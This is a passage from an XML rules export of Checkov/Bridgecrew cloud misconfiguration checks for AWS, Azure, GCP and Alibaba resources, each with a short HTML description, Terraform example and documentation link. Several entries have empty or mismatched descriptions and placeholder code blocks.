      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-webserver-logs-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_265</key>
    <name>Ensure AWS Keyspace Table uses Customer Managed Keys (CMKs)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-keyspace-table-does-not-use-customer-managed-keys-cmks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-keyspace-table-does-not-use-customer-managed-keys-cm-ks"></div>AWS Keyspace Table does not use Customer Managed Keys (CMKs)</div><a aria-label="Skip link to AWS Keyspace Table does not use Customer Managed Keys (CMKs)" class="heading-anchor-icon fa fa-anchor" href="#aws-keyspace-table-does-not-use-customer-managed-keys-cmks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Keyspace Tables which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Keyspace Table data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-aws_keyspaces_table"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-aws-keyspaces-table"></div>Resource: aws_keyspaces_table</div><a aria-label="Skip link to Resource: aws_keyspaces_table" class="heading-anchor-icon fa fa-anchor" href="#resource-aws_keyspaces_table"></a></h2>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arguments-encryption_specificationkms_key_identifier"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arguments-encryption-specification-kms-key-identifier"></div>Arguments: encryption_specification.kms_key_identifier</div><a aria-label="Skip link to Arguments: encryption_specification.kms_key_identifier" class="heading-anchor-icon fa fa-anchor" href="#arguments-encryption_specificationkms_key_identifier"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_keyspaces_table" "pass" {
  keyspace_name = aws_keyspaces_keyspace.example.name
  table_name    = "my_table"

  schema_definition {
    column {
      name = "Message"
      type = "ASCII"
    }

    partition_key {
      name = "Message"
    }
  }
  encryption_specification {
    kms_key_identifier=aws_kms_key.example.arn
    type="CUSTOMER_MANAGED_KEY"
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-keyspace-table-uses-customer-managed-keys-cmks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-keyspace-table-uses-customer-managed-keys-cmks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-keyspace-table-uses-customer-managed-keys-cmks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_197</key>
    <name>Ensure AWS MQBroker audit logging is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-mqbroker-audit-logging-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-mq-broker-audit-logging-is-disabled"></div>AWS MQBroker audit logging is disabled</div><a aria-label="Skip link to AWS MQBroker audit logging is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-mqbroker-audit-logging-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-mqbroker-audit-logging-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-mqbroker-audit-logging-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-mqbroker-audit-logging-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_141</key>
    <name>Ensure Azure Kubernetes Service (AKS) local admin account is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-subscriptions-with-custom-roles-are-overly-permissive"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-subscriptions-with-custom-roles-are-overly-permissive"></div>Azure subscriptions with custom roles are overly permissive</div><a aria-label="Skip link to Azure subscriptions with custom roles are overly permissive" class="heading-anchor-icon fa fa-anchor" href="#azure-subscriptions-with-custom-roles-are-overly-permissive"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_role_definition</li>
<li><strong>Argument</strong>: actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_role_definition" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-kubernetes-service-aks-local-admin-account-is-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-kubernetes-service-aks-local-admin-account-is-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-kubernetes-service-aks-local-admin-account-is-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_91</key>
    <name>Ensure GCP Dataproc cluster is encrypted with Customer Supplied Encryption Keys (CSEKs)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-dataproc-cluster-is-not-encrypted-with-customer-supplied-encryption-keys-cseks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-dataproc-cluster-is-not-encrypted-with-customer-supplied-encryption-keys-cse-ks"></div>GCP Dataproc cluster is not encrypted with Customer Supplied Encryption Keys (CSEKs)</div><a aria-label="Skip link to GCP Dataproc cluster is not encrypted with Customer Supplied Encryption Keys (CSEKs)" class="heading-anchor-icon fa fa-anchor" href="#gcp-dataproc-cluster-is-not-encrypted-with-customer-supplied-encryption-keys-cseks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Customer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.</p>
<p>We recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Dataproc cluster. This helps protect the Google-generated keys used to encrypt and decrypt your data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource</strong>:google_dataproc_cluster</li>
<li><strong>Arguments</strong>: cluster_config.encryption_config.kms_key_name</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_dataproc_cluster" "pass" {
  name   = "simplecluster"
  region = "us-central1"
  cluster_config {
     encryption_config{
       kms_key_name="SecretSquirrel"
     }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-is-encrypted-with-customer-supplied-encryption-keys-cseks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-is-encrypted-with-customer-supplied-encryption-keys-cseks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-is-encrypted-with-customer-supplied-encryption-keys-cseks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_153</key>
    <name>Ensure Azure web app redirects all HTTP traffic to HTTPS in Azure App Service Slot</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-web-app-does-not-redirect-all-http-traffic-to-https-in-azure-app-service-slot"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-web-app-does-not-redirect-all-http-traffic-to-https-in-azure-app-service-slot"></div>Azure web app does not redirect all HTTP traffic to HTTPS in Azure App Service Slot</div><a aria-label="Skip link to Azure web app does not redirect all HTTP traffic to HTTPS in Azure App Service Slot" class="heading-anchor-icon fa fa-anchor" href="#azure-web-app-does-not-redirect-all-http-traffic-to-https-in-azure-app-service-slot"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_cognitive_account</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-web-app-redirects-all-http-traffic-to-https-in-azure-app-service-slot' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-web-app-redirects-all-http-traffic-to-https-in-azure-app-service-slot</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-web-app-redirects-all-http-traffic-to-https-in-azure-app-service-slot' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_44</key>
    <name>Ensure Alibaba Cloud MongoDB has transparent data encryption enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-mongodb-does-not-have-transparent-data-encryption-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-mongo-db-does-not-have-transparent-data-encryption-enabled"></div>Alibaba Cloud MongoDB does not have transparent data encryption enabled</div><a aria-label="Skip link to Alibaba Cloud MongoDB does not have transparent data encryption enabled" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-mongodb-does-not-have-transparent-data-encryption-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-has-transparent-data-encryption-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-has-transparent-data-encryption-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-has-transparent-data-encryption-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_203</key>
    <name>Ensure AWS FSX openzfs file system is encrypted by AWS' Key Management Service (KMS) using a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-fsx-openzfs-is-not-encrypted-by-aws-key-management-service-kms-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-fsx-openzfs-is-not-encrypted-by-aws-key-management-service-kms-using-a-customer-managed-key-cmk"></div>AWS FSX openzfs is not encrypted by AWS' Key Management Service (KMS) using a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS FSX openzfs is not encrypted by AWS' Key Management Service (KMS) using a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-fsx-openzfs-is-not-encrypted-by-aws-key-management-service-kms-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies  FSX openzfs file systems which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your  FSX openzfs file system data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<p>Resource: aws_fsx_openzfs_file_system<br/>
Arguments: kms_key_id</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_fsx_openzfs_file_system" "pass" {
  storage_capacity                = var.file_system.storage_capacity
  subnet_ids                      = var.subnet_ids
  deployment_type                 = var.file_system.deployment_type
  throughput_capacity             = var.file_system.throughput_capacity
  kms_key_id                      = var.kms_key_id
  automatic_backup_retention_days = 0 #flag as no bckup
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-fsx-openzfs-file-system-is-encrypted-by-aws-key-management-service-kms-using-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-fsx-openzfs-file-system-is-encrypted-by-aws-key-management-service-kms-using-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-fsx-openzfs-file-system-is-encrypted-by-aws-key-management-service-kms-using-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_137</key>
    <name>Ensure Azure ACR admin account is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-acr-admin-account-is-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-acr-admin-account-is-enabled"></div>Azure ACR admin account is enabled</div><a aria-label="Skip link to Azure ACR admin account is enabled" class="heading-anchor-icon fa fa-anchor" href="#azure-acr-admin-account-is-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_role_definition</li>
<li><strong>Argument</strong>: actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_role_definition" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-acr-admin-account-is-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-acr-admin-account-is-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-acr-admin-account-is-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_202</key>
    <name>Ensure AWS MemoryDB data is encrypted in transit</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-memorydb-data-is-not-encrypted-in-transit"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-memory-db-data-is-not-encrypted-in-transit"></div>AWS MemoryDB data is not encrypted in transit</div><a aria-label="Skip link to AWS MemoryDB data is not encrypted in transit" class="heading-anchor-icon fa fa-anchor" href="#aws-memorydb-data-is-not-encrypted-in-transit"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-memorydb-data-is-encrypted-in-transit' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-memorydb-data-is-encrypted-in-transit</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-memorydb-data-is-encrypted-in-transit' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_147</key>
    <name>Ensure Azure PostgreSQL uses the latest version of TLS encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-postgresql-does-not-use-the-latest-version-of-tls-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-postgre-sql-does-not-use-the-latest-version-of-tls-encryption"></div>Azure PostgreSQL does not use the latest version of TLS encryption</div><a aria-label="Skip link to Azure PostgreSQL does not use the latest version of TLS encryption" class="heading-anchor-icon fa fa-anchor" href="#azure-postgresql-does-not-use-the-latest-version-of-tls-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-postgresql-uses-the-latest-version-of-tls-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-postgresql-uses-the-latest-version-of-tls-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-postgresql-uses-the-latest-version-of-tls-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_207</key>
    <name>Ensure MQ Broker minor version updates are enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-mq-brokers-minor-version-updates-are-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-mq-brokers-minor-version-updates-are-disabled"></div>AWS MQ Broker's minor version updates are disabled</div><a aria-label="Skip link to AWS MQ Broker's minor version updates are disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-mq-brokers-minor-version-updates-are-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
